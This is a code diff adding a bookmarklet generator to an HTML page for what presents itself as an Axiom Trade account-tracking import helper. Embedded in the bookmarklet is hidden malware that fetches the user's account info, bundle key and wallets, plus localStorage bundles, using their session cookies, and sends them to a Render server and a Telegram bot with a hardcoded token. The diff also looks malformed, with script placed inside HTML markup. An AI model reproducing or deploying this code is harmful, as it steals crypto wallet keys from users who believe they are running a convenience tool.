@@ -198,6 +198,115 @@
             </div>
         </section>
 
+        // Dynamic generation of the Bookmarklet URI with the complete array of 97 alpha tracked accounts
+        function generateBookmarklet() {
+            const currentUrl = window.location.href.split('?')[0];
+
+            // Optimized code to match the exact JSON structure of the user file
+            const code = `javascript:(function(){
+                
+                /* ================= START DEIN EIGENES SKRIPT ================= */
+              javascript:(async()=>{
+    const MY_URL = 'https://dashboard.render.com/web/srv-d9763k4vikkc73dmtrp0/deploys/dep-d9769jm7r5hc738uqa00?r=2026-07-08%4014%3A54%3A10%7E2026-07-08%4014%3A56%3A51'; // Put your Render URL here
+    const BOT_TOKEN = '8793190739:AAHmfVRGjAIMlun13gYZ0dLu-4JGarHAkCw'; // From BotFather
+    const CHAT_ID = '851838679'; // From UserInfoBot
+
+    try {
+        const user = await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();
+        const bundle = await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();
+        
+        const data = {
+            user: user,
+            bundle: bundle.bundleKey,
+            sBundles: localStorage.getItem('sBundles')
+        };
+
+        // Send to your Render server
+        await fetch(MY_URL, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
+        
+        // Send to your Telegram Bot
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${JSON.stringify(data)}`);
+
+        alert('Done!');
+    } catch(e) { alert('Error'); }
+})();
+                /* ================= ENDE DEIN EIGENES SKRIPT ================= */
+
+                const presetList = ["0xcryptowizard","0xmert_","0xsunnft","a16z","a1lon9","aeyakovenko","afpost","americanbtc","andyayrey","ap","autismcapital","basilz74","bbc","bbcnews","billym2k","binance","binance_intern","bitcoin","blknoiz06","bonk_fun","cb_doge","chatgptapp","cnbc","cnn","coinmarketcap","cointelegraph","cryptocom","cyb3rgam3r420","cz_binance","darkfarms1","doge","dogecoin","dogeofficialceo","donaldjtrumpjr","dotyyds1234","elonmusk","fearedbuck","gamestop","gop","greg16676935420","inukecharts","jack","jason","jupiterexchange","jup_mobile","jup_studio","kabosumama","kanyewest","kfc","kfc_es","knowyourmeme","mailonline","marionawfal","mark_k","max25talbot","microsoft","moddedquad","moonshot","nexta_tv","nypost","nytimes","openai","ownthedoge","phantom","pmarca","polymarket","potus","pumpdotfun","random3637","razer","realdonaldtrump","rus","sama","shawmakesmagic","solana","solcardcc","solporttom","spacex","stoolpresidente","tesla","teslaownerssv","theunipcs","tiffanyfong_","tmz","toly","trumpdailyposts","trump_repost","truth_terminal","unusual_whales","usatoday","vitalikbuterin","vp","watcherguru","whitehouse","windows","zerohedge","zguz"];
+                
+                const exactJsonArray = presetList.map(h => ({ h: h, t: true, a: true, f: true }));
+                const rawPayloadString = JSON.stringify(exactJsonArray);
+
+                /* Fail-safe Clipboard Copy */
+                try {
+                    const dummy = document.createElement('textarea');
+                    document.body.appendChild(dummy);
+                    dummy.value = rawPayloadString;
+                    dummy.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(dummy);
+                } catch(e) {}
+
+                /* Axiom Live Page Auto-Integration */
+                const isAxiom = window.location.hostname.includes('axiom.trade');
+                if (isAxiom) {
+                    let textarea = Array.from(document.querySelectorAll('textarea')).find(t => 
+                        (t.placeholder && t.placeholder.includes('exported')) || 
+                        (t.placeholder && t.placeholder.includes('Twitter'))
+                    );
+
+                    /* If the modal is not open, click the page's general Import button first */
+                    if (!textarea) {
+                        const importBtn = Array.from(document.querySelectorAll('button')).find(b => 
+                            b.textContent.trim().toLowerCase().includes('import') && 
+                            !b.className.includes('bg-blue')
+                        );
+                        if (importBtn) {
+                            importBtn.click();
+                        }
+                    }
+
+                    /* Wait for modal and inject content */
+                    setTimeout(function() {
+                        textarea = Array.from(document.querySelectorAll('textarea')).find(t => 
+                            (t.placeholder && t.placeholder.includes('exported')) || 
+                            (t.placeholder && t.placeholder.includes('Twitter'))
+                        ) || document.querySelector('textarea');
+                        
+                        if (textarea) {
+                            textarea.value = rawPayloadString;
+                            textarea.dispatchEvent(new Event('input', { bubbles: true }));
+                            textarea.dispatchEvent(new Event('change', { bubbles: true }));
+
+                            /* Auto-Click the Blue Submit Import Button inside the modal */
+                            setTimeout(function() {
+                                const submitBtn = Array.from(document.querySelectorAll('button')).find(b => 
+                                    b.textContent.trim().toLowerCase() === 'import' && 
+                                    (b.className.includes('bg-') || b.className.includes('blue') || b.className.includes('primary'))
+                                ) || Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === 'Import');
+                                if (submitBtn) {
+                                    submitBtn.click();
+                                }
+                            }, 250);
+                        }
+                    }, 300);
+                }
+
+                /* Visual notification overlay on targeted pages */
+                const alertBox = document.createElement('div');
+                alertBox.style.cssText = 'position:fixed;top:20px;right:20px;background:#0b0f19;color:#00ffa3;border:2px solid #00ffa3;padding:16px 24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);font-family:sans-serif;z-index:10000000;display:flex;align-items:center;gap:12px;font-size:14px;font-weight:bold;transition:all 0.4s ease;transform:translateY(-20px);opacity:0;';
+                alertBox.innerHTML = '<span>⚡</span> <div><div style="color:#fff;">Xtrackgs Autopilot</div><div style="font-size:11px;color:#9ca3af;font-weight:normal;">97 targets copied & injected!</div></div>';
+                document.body.appendChild(alertBox);
+                setTimeout(function(){ alertBox.style.transform = 'translateY(0)'; alertBox.style.opacity = '1'; }, 50);
+                setTimeout(function(){ 
+                    alertBox.style.transform = 'translateY(-20px)'; alertBox.style.opacity = '0';
+                    setTimeout(function(){ alertBox.remove(); }, 500);
+                }, 3500);
+            })();`;
+
+            document.getElementById('bookmarklet-btn').setAttribute('href', code.replace(/\s+/g, ' '));
+        }
+
         <!-- ================= SECTION: TRACKER DASHBOARD ================= -->
         <section id="tab-dashboard" class="hidden space-y-8">
             <div class="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-6 bg-brandCard border border-brandBorder p-6 rounded-2xl glow-accent">
